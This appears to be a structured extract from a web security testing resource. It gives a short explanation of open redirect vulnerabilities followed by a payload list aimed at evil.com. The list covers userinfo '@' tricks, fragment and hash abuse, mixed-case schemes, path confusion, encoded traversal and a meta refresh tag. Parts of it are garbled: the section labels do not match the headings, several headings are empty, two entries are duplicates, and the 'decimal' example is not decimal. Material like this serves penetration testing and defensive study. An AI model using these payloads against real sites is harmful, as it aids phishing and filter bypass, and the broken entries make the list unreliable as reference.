blocks.text: Open redirect vulnerabilities occur when a web application accepts user-controlled input that specifies a link to an external site and uses that link in a redirect. This can be used for phishing attacks or to bypass security controls.
Submit external URLs in redirect parameters to test if the application redirects to arbitrary external sites.
See `open-redirect-payloads.txt` for a comprehensive list of open redirect payloads.

files.name: open-redirect-payloads.txt

sections.label: Userinfo-style open redirect (browsers treat text before @ as userinfo, not host)
Tab/newline injected before the scheme to slip past naive allowlist regex
Double-encoded path traversal back into an absolute redirect

## Using Hash

http://legitimate.com@evil.com?redirect=http://evil.com
//legitimate.com@evil.com%2F
http://evil.com%23legitimate.com

## Special Characters
http://evil。com (using Unicode dot)
http://evil。com (using full-width dot)

## Bypass with URL Fragments
#http://evil.com
#//evil.com

## Using Meta Refresh
<meta http-equiv="refresh" content="0;url=http://evil.com">

## Mixed Case to Bypass Filters
HTtp://evil.com
HttPs://evil.com
hTTp://evil.com

## Decimal Encoding
http://1.2.3.4 (where 1.2.3.4 is the decimal representation)

## Octal Encoding

## Using Port Numbers
http://evil.com:80
http://evil.com:443
http://evil.com:8080

## Path Confusion
/http://evil.com
\/http://evil.com
//http://evil.com

## Relative Path Manipulation
../../../evil.com
..%2F..%2F..%2Fevil.com

## Using Open Graph Protocol

## Flash-based Redirect
http://legitimate.com/flash.swf?url=http://evil.com

## PDF-based Redirect
http://legitimate.com/file.pdf#http://evil.com

## Using Referrer Header
